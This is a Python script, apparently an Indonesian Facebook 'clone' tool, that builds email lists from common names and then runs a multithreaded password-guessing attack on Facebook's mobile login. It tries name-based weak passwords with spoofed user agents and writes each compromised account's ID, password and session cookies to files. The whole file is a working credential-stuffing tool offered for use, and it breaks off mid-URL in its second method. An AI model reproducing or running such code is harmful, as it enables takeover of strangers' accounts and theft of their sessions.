#__________________IMPORT____________#
import os,sys,rich,bs4,json,re,random,requests,time,datetime
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
	print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
	os.system('pip install rich')
	os.system('pip install requests')
	os.system('pip install bs4')
#__________________ COLOR __________________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________ LOOP __________________
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,oks,cps=[],[],[],[],[],[],[],0,0,0
rc = random.choice
rr = random.randint
#__________________ LINE __________________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
	os.system(f'clear')
	print(logo)
#__________________ SAVE OK CP __________________#
bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = datetime.datetime.now().day
bulan = bulane[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
nbf_ok = 'NBF_OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
nbf_cp = 'NBF_CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
#__________________ USER AGENT __________________#
def api():
	rr = random.randint
	rc = random.choice
	versi = random.choice(["pt-BR","id","en"])
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	mmk = f"Mozilla/5.0 (Linux; U; Viera; {versi}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(70,200))} Safari/537.36 SmartTV"
	mm1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(25,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast)"
	return random.choice([ua1,ua2,ua3,ua4,ua5,mmk,mm1])	
#__________________ LOGO KONTOL __________________#
logo=(f"""{G1}╔╗╔╔═╗╔╗╔╔═╗  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗  
{X5}║║║║ ║║║║╠═╣  ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ║ ║╠╦╝║  ║╣   
{S}╝╚╝╚═╝╝╚╝╩ ╩  ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝╩╚═╚═╝╚═╝  
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{A} Author   : {R}NonaXafier
{G1}[{A}≈{G1}]{A} Tools    : {X5}Free
{G1}[{A}≈{G1}]{A} Facebook : {X1}Nona Xafier
{G1}[{A}≈{G1}]{A} Github   : {B}NonaDev41
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________ MAIN TOOLS RUNNING __________________#
def Main():
	clear()
	print(f'{G1}[{A}1{G1}]{S} GMAIL CLONE ')
	print(f'{G1}[{A}2{G1}]{S} YAHOO CLONE ')
	print(f'{G1}[{A}3{G1}]{S} FILE CLONE ')
	linex()
	nona_xafier = input(f'{S}[{X5}>{S}] Choose: {G1}')
	if nona_xafier in ['1','01']:Gmail()
	elif nona_xafier in ['2','02']:Yahoo()
	elif nona_xafier in ['3','03']:File()
	else:Main()
#__________________ YAHOO CLONE __________________#
def Yahoo():
	dump=[]
	clear()
	print(f'{A}[{S}>{A}] Gunakan {B}Nama {A}Depan Saja')
	print(f'{A}[{S}>{A}] Gunakan Tanda {R}({X5},{R}){A} Untuk Pemisah Nama')
	linex()
	tengah = ['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela']
	global ok , cc
	nama = input(f'\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Nama Depan : ').split(',')
	linex()
	if 'KANJUT' in str(nama):
		print(f'{A} Masukan Nama Depan Saja, {R}Jangan Kosong')
		linex()
		time.sleep(3);exit()
	doma = '@yahoo.com'
	jumlah = input(f'{A}[{S}>{A}] Input Limit : {S}')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		II = f'{str(rr(0,1000))}'
		BB = f'{str(rc(tengah))}'
		CC = doma
		DD = f'{AA}{BB}{II}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:setting()
	setting()
#__________________ GMAIL CLONE __________________#
def Gmail():
	dump=[]
	clear()
	print(f'{A}[{S}>{A}] Gunakan {B}Nama {A}Depan Saja')
	print(f'{A}[{S}>{A}] Gunakan Tanda {R}({X5},{R}){A} Untuk Pemisah Nama')
	linex()
	tengah = ['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela']
	global ok , cc
	nama = input(f'\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Nama Depan : ').split(',')
	linex()
	if 'KANJUT' in str(nama):
		print(f'{A} Masukan Nama Depan Saja, {R}Jangan Kosong')
		linex()
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = input(f'{A}[{S}>{A}] Input Limit : {S}')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		II = f'{str(rr(0,1000))}'
		BB = f'{str(rc(tengah))}'
		CC = doma
		DD = f'{AA}{BB}{II}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:setting()
	setting()
#__________________ FILE CLONE __________________#
def File():
	try:
		clear()
		print(f'{A}[{S}>{A}] Masukan File Contoh {S}[{X5}>{S}] {G1}/sdcard/dump.txt')
		linex()
		fileX = input (f'{A}[{S}>{A}] File Path : {G3}')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f"{S}[{R}!{S}] Input File Yang Benar")
		sleep(2);login()
#__________________ SETTING __________________#
def setting():
	for bacot in id:
		xx = rr(0,len(id2))
		id2.insert(xx,bacot)
	linex()
	print(f'{A}[{S}1{A}] m.facebook.com')
	print(f'{A}[{S}2{A}] mbasic.facebook.com')
	linex()
	metode = random = input(f'{G1}[{A}?{G1}]{A} Method Select : {X2}')
	linex()
	if metode in ['1','01']:
		method.append('mobile')
	elif metode in ['2','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
#__________________ PASSWRD __________________#
def passwrd():
	print(f'{A}[{S}•{A}] Total Ids Account Collect {S}> {A}{str(len(id))}')
	print(f'{A}[{S}•{A}] Mainkan Mode {G1}Pesawat{A} Setiap {B}500{A} Ids')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [frs+'123',frs+'12345']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'mobile' in method:
				pool.submit(ngekrek,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(krek,idf,pwv)
			else:
				pool.submit(ngekrek,idf,pwv)
#__________________ METHOD RUNNING __________________#
def ngekrek(idf,pwv):
	global loop,oks,cps
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	md = random.choice([G2,A,B,R,M,X,X5,G3,A,S,B,Y,X5,G2,G5,A,S,B,Y,R])
	rd = random.choice([G2,A,B,R,M,X,X5,G3,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r{rd}[{dm}•{md}] {A}NONA-{dm}M1{A}|{md}{loop}{A}|{rd}{len(id)}{A}|OK-{G1}{oks}{A}|CP-{Y}{cps}")
	sys.stdout.flush()
	ua = api()
	ses = requests.Session()
	for pw in pwv:
		try: 
			link = ses.get('https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {
'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'dpr': '2',
'origin': 'https://m.alpha.facebook.com',
'referer': 'https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(110,120))}"',
'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(110,120))}.0.{str(rr(3000,6000))}.{str(rr(110,120))}"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': ua,
'viewport-width': f'{str(rr(300,999))}',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'x-requested-with': 'XMLHttpRequest',
'x-response-format': 'JSONStream',
}
			params = {
'refsrc': 'deprecated',
'lwv': '100',
}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',params=params,headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				oks+=1
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{A}[{S}>{A}] User : {G1}{idf}\n{A}[{S}>{A}] Pass : {G1}{pw}\n{A}[{S}>{A}] Kuki : {B}{kuki}\n')
				open('NBF_OK/'+nbf_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cps+=1
				print(f'\r{A}[{S}>{A}] User : {Y}{idf}\n{A}[{S}>{A}] Pass : {Y}{pw}\n{A}[{S}>{A}] Ugen : {X3}{ua}\n')
				open('NBF_CP/'+nbf_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

def krek(idf,pwv):
	global loop,oks,cps
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	md = random.choice([G2,A,B,R,M,X,X5,G3,A,S,B,Y,X5,G2,G5,A,S,B,Y,R])
	rd = random.choice([G2,A,B,R,M,X,X5,G3,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r{rd}[{dm}•{md}] {A}NONA-{dm}M2{A}|{md}{loop}{A}|{rd}{len(id)}{A}|OK-{G1}{oks}{A}|CP-{Y}{cps}")
	sys.stdout.flush()
	ua = api()
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=467906450393051&kid_directed_site=0&app_id=467906450393051&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbb8140ae-5f4b-494a-bcdc-4a23a7a3beb5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DfNBNHEScN9X4Bkhxf7QKwOq0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1707402570&subno_key=AaGNA7BkzdBj7_VZWCmSSlXd9qVDBPgdCNdArwpV89AeiqGkwRZWLPZ23Eyac4gxcx2oR8Rq8GrVxwMg29NSjVX9J52OzwZWR7XDfUoP4fUw8HtRxgnX-1EjMso7TH9Yc_dDKKoReoGfSpdV5DMVE1o7llDCdcgz